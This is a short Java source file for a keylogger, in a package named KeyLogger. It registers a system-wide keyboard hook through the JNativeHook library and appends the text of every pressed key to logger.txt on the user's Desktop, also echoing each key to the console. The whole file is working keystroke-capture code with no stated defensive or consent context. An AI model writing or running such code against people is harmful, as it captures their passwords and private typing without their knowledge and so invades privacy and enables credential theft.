package KeyLogger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 * Hello world!
 *
 */
public class App implements NativeKeyListener
{
    private static final String FILENAME = System.getProperty("user.home") + "\\Desktop" + "\\logger.txt";

    public static void main( String[] args ) {

        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }

        GlobalScreen.addNativeKeyListener(new App());

        // Get the logger for "org.jnativehook" and set the level to warning.
        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.WARNING);

        // Don't forget to disable the parent handlers.
        logger.setUseParentHandlers(false);

    }


    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        String keyPressed = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());

        System.out.println("Pressed: " + keyPressed);

        try(BufferedWriter bw = new BufferedWriter(new FileWriter(FILENAME, true))){

            bw.write(keyPressed +" ");

        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
//        System.out.println("Released: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }
}
